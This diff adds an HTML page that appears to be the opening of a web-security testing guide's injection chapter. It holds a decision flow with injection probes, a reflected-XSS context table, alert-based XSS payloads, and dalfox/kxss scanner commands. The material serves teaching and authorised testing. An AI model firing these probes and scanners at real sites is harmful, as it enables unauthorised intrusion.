+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#41-cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1 Cross-Site Scripting (XSS)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.1 Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#411-reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.1 Reflected XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#412-stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.2 Stored XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#413-dom-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.3 DOM XSS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#414-xss-filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.4 XSS Filter Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#415-xss-to-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.5 XSS to Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#416-csp-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.6 CSP Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#417-xss-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.1.7 XSS Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#42-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2 SQL Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.2 SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#421-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#422-sqli-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.2 SQLi Types
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#423-sqlmap-usage-on-live-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.3 sqlmap Usage on Live Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#424-second-order-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.4 Second-Order SQLi
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#425-sqli-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.2.5 SQLi Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#43-server-side-template-injection-ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3 Server-Side Template Injection (SSTI)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 Server-Side Template Injection (SSTI)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#431-detection-and-engine-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.1 Detection and Engine Identification
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#432-rce-payloads-by-engine" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.2 RCE Payloads by Engine
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#433-ssti-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.3.3 SSTI Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#44-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4 Command Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.4 Command Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#441-detection-probes" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.1 Detection Probes
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#442-blind-oob-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.2 Blind OOB Exfiltration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#443-hidden-attack-surfaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.4.3 Hidden Attack Surfaces
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#45-cross-site-request-forgery-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5 Cross-Site Request Forgery (CSRF)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.5 Cross-Site Request Forgery (CSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#451-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.1 Detection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#452-poc-construction" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.2 PoC Construction
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#453-samesite-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.5.3 SameSite Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#46-crlf-injection--header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.6 CRLF Injection &amp; Header Injection
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.6 CRLF Injection &amp; Header Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#461-detection-and-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.6.1 Detection and Escalation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#47-insecure-deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7 Insecure Deserialization
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.7 Insecure Deserialization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#471-identifying-serialized-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7.1 Identifying Serialized Data
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#472-safe-poc-by-language" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        4.7.2 Safe PoC by Language
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-4-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 4 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="injection">Injection<a class="headerlink" href="#injection" title="Permanent link">&para;</a></h1>
+<p>Injection happens when user-controlled data is interpreted as code or commands in a context where it shouldn't be. Every place the application takes input and does something with it is a potential injection point. The question is always: <em>what context does this input land in, and what characters control that context?</em></p>
+<hr />
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 17.56 4.07-1.13.55-6.1H9.38L9.2 8.3h7.6l.2-1.99H7l.56 6.01h6.89l-.23 2.58-2.22.6-2.22-.6-.14-1.66h-2l.29 3.19zM4.07 3h15.86L18.5 19.2 12 21l-6.5-1.8z"/></svg></span> <strong>4.1 Cross-Site Scripting</strong></p>
+<hr />
+<p>Reflected, stored, DOM, blind. Context identification. Filter bypass. ATO escalation.</p>
+<p><a href="#41-cross-site-scripting-xss"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> XSS</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.68 12.32a4.49 4.49 0 0 0-6.36.01 4.49 4.49 0 0 0 0 6.36 4.51 4.51 0 0 0 5.57.63L21 22.39 22.39 21l-3.09-3.11c1.13-1.77.87-4.09-.62-5.57m-1.41 4.95c-.98.98-2.56.97-3.54 0-.97-.98-.97-2.56.01-3.54.97-.97 2.55-.97 3.53 0 .97.98.97 2.56 0 3.54M10.9 20.1a6.5 6.5 0 0 1-1.48-2.32C6.27 17.25 4 15.76 4 14v3c0 2.21 3.58 4 8 4-.4-.26-.77-.56-1.1-.9M4 9v3c0 1.68 2.07 3.12 5 3.7v-.2c0-.93.2-1.85.58-2.69C6.34 12.3 4 10.79 4 9m8-6C7.58 3 4 4.79 4 7c0 2 3 3.68 6.85 4h.05c1.2-1.26 2.86-2 4.6-2 .91 0 1.81.19 2.64.56A3.22 3.22 0 0 0 20 7c0-2.21-3.58-4-8-4"/></svg></span> <strong>4.2 SQL Injection</strong></p>
+<hr />
+<p>Error-based, boolean blind, time-based, OOB, second-order, non-standard locations.</p>
+<p><a href="#42-sql-injection"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> SQLi</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8 3a2 2 0 0 0-2 2v4a2 2 0 0 1-2 2H3v2h1a2 2 0 0 1 2 2v4a2 2 0 0 0 2 2h2v-2H8v-5a2 2 0 0 0-2-2 2 2 0 0 0 2-2V5h2V3m6 0a2 2 0 0 1 2 2v4a2 2 0 0 0 2 2h1v2h-1a2 2 0 0 0-2 2v4a2 2 0 0 1-2 2h-2v-2h2v-5a2 2 0 0 1 2-2 2 2 0 0 1-2-2V5h-2V3z"/></svg></span> <strong>4.3 Server-Side Template Injection</strong></p>
+<hr />
+<p>Polyglot detection, engine identification, RCE per engine.</p>
+<p><a href="#43-server-side-template-injection-ssti"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> SSTI</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12zm0-16a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-7 14v-2h5v2zm-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59z"/></svg></span> <strong>4.4 Command Injection</strong></p>
+<hr />
+<p>Shell separators, blind via sleep, OOB exfiltration, hidden attack surfaces.</p>
+<p><a href="#44-command-injection"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> CMDi</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12L5 6.3v4.92C5 15.54 8.25 20 12 21M11 7h2v6h-2zm0 8h2v2h-2z"/></svg></span> <strong>4.5 CSRF</strong></p>
+<hr />
+<p>Token bypass, JSON CSRF, SameSite bypass, PoC construction.</p>
+<p><a href="#45-cross-site-request-forgery-csrf"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> CSRF</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 11a4 4 0 0 1-4-4 4 4 0 0 1 4-4h8v2h-2v16h-2V5h-2v16h-2z"/></svg></span> <strong>4.6 CRLF Injection</strong></p>
+<hr />
+<p>Header injection, response splitting, session fixation, XSS escalation.</p>
+<p><a href="#46-crlf-injection--header-injection"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> CRLF</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 10.96a.985.985 0 0 1-.37-1.37L3.13 7c.11-.2.28-.34.47-.42l7.83-4.4c.16-.12.36-.18.57-.18s.41.06.57.18l7.9 4.44c.19.1.35.26.44.46l1.45 2.52c.28.48.11 1.09-.36 1.36l-1 .58v4.96c0 .38-.21.71-.53.88l-7.9 4.44c-.16.12-.36.18-.57.18s-.41-.06-.57-.18l-7.9-4.44A.99.99 0 0 1 3 16.5v-5.54c-.3.17-.68.18-1 0m10-6.81v6.7l5.96-3.35zM5 15.91l6 3.38v-6.71L5 9.21zm14 0v-3.22l-5 2.9c-.33.18-.7.17-1 .01v3.69zm-5.15-2.55 6.28-3.63-.58-1.01-6.28 3.63z"/></svg></span> <strong>4.7 Insecure Deserialization</strong></p>
+<hr />
+<p>Java, PHP, Python pickle. Safe OOB PoC without RCE.</p>
+<p><a href="#47-insecure-deserialization"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Deserialization</a></p>
+</li>
+</ul>
+</div>
+<hr />
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Input is reflected back in the HTML response?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ XSS. Identify context first, then payload.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Parameter changes query results or causes a DB error?
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>→ SQLi. Boolean test first, then time-based if blind.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Input appears rendered inside an email template, notification, or page content?
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>→ SSTI. Inject polyglot probe — {{7*7}}${7*7}&lt;%= 7*7 %&gt;
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Feature invokes OS utilities (ping, DNS, conversion, PDF generation)?
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>→ Command injection. ;sleep 5 to confirm blind.
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>State-changing endpoint with no CSRF token?
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>→ Build PoC HTML. Test SameSite cookie attribute.
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Value in cookie or hidden field looks base64 and binary?
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>→ Deserialization. Decode and check magic bytes before anything else.
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>Redirect parameter or value reflected in response header?
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>→ CRLF. Inject %0d%0a and check response headers.
+</span></code></pre></div>
+<hr />
+<h2 id="41-cross-site-scripting-xss">4.1 Cross-Site Scripting (XSS)<a class="headerlink" href="#41-cross-site-scripting-xss" title="Permanent link">&para;</a></h2>
+<p>User-supplied input is rendered in a browser context without proper encoding, allowing an attacker to execute arbitrary JavaScript in the victim's browser. Impact ranges from cookie theft and session hijacking to full account takeover, keylogging, and phishing under the trusted domain.</p>
+<p><strong>The three types have different sources, sinks, and testing approaches.</strong></p>
+<h3 id="411-reflected-xss">4.1.1 Reflected XSS<a class="headerlink" href="#411-reflected-xss" title="Permanent link">&para;</a></h3>
+<p>The payload is in the request and immediately reflected back in the response. Requires the victim to visit a crafted URL.</p>
+<p><strong>Step 1 — identify reflection, Step 2 — identify context, Step 3 — payload.</strong></p>
+<p><strong>The five HTML contexts:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>Example</th>
+<th>Breaking Character</th>
+<th>Payload Start</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML body</td>
+<td><code>&lt;div&gt;INPUT&lt;/div&gt;</code></td>
+<td><code>&lt;</code></td>
+<td><code>&lt;script&gt;</code> or <code>&lt;img src=x onerror=...&gt;</code></td>
+</tr>
+<tr>
+<td>HTML attribute (quoted)</td>
+<td><code>&lt;input value="INPUT"&gt;</code></td>
+<td><code>"</code></td>
+<td><code>"&gt;&lt;script&gt;</code></td>
+</tr>
+<tr>
+<td>HTML attribute (unquoted)</td>
+<td><code>&lt;input value=INPUT&gt;</code></td>
+<td>space or <code>&gt;</code></td>
+<td><code>onmouseover=alert(1)</code></td>
+</tr>
+<tr>
+<td>JavaScript string</td>
+<td><code>var x = "INPUT";</code></td>
+<td><code>"</code> or <code>'</code></td>
+<td><code>"-alert(1)-"</code></td>
+</tr>
+<tr>
+<td>JS template literal</td>
+<td><code>var x = `INPUT`;</code></td>
+<td><code>`</code></td>
+<td><code>`${alert(1)}`</code></td>
+</tr>
+<tr>
+<td>URL attribute</td>
+<td><code>&lt;a href="../INPUT"&gt;</code></td>
+<td>—</td>
+<td><code>javascript:alert(1)</code></td>
+</tr>
+</tbody>
+</table>
+<div class="language-javascript highlight"><span class="filename">starter_payloads.js</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">// Basic — works if no filtering:</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1">// Attribute break:</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="s2">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="s2">&quot;</span><span class="o">&gt;&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="s2">&quot; onmouseover=&quot;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1">// JS string context:</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="s2">&quot;;alert(1)//</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="s2">&#39;-alert(1)-&#39;</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="s2">// No script tag:</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="s2">&lt;img src=x onerror=alert(1)&gt;</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="s2">&lt;svg onload=alert(1)&gt;</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="s2">&lt;details open ontoggle=alert(1)&gt;</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="s2">&lt;iframe src=&quot;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="err">&quot;</span><span class="o">&gt;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">xss_tools.sh</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Dalfox — fast, accurate</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>dalfox<span class="w"> </span>url<span class="w"> </span><span class="s2">&quot;https://target.com/search?q=FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>--skip-bav<span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;session=&lt;token&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span>--output<span class="w"> </span>dalfox_results.txt
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># Pipe from parameter list:</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>cat<span class="w"> </span>params.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>dalfox<span class="w"> </span>pipe<span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;session=&lt;token&gt;&quot;</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># kxss — fast inline scanner for reflected params:</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>cat<span class="w"> </span>urls.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>kxss
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">alert(1) gets blocked</p>
+<p>Use <code>alert(document.domain)</code> instead. It proves domain context and is harder to filter or false-positive on. Always confirm execution in a real browser — curl output is not enough.</p>
+</div>
+<hr />
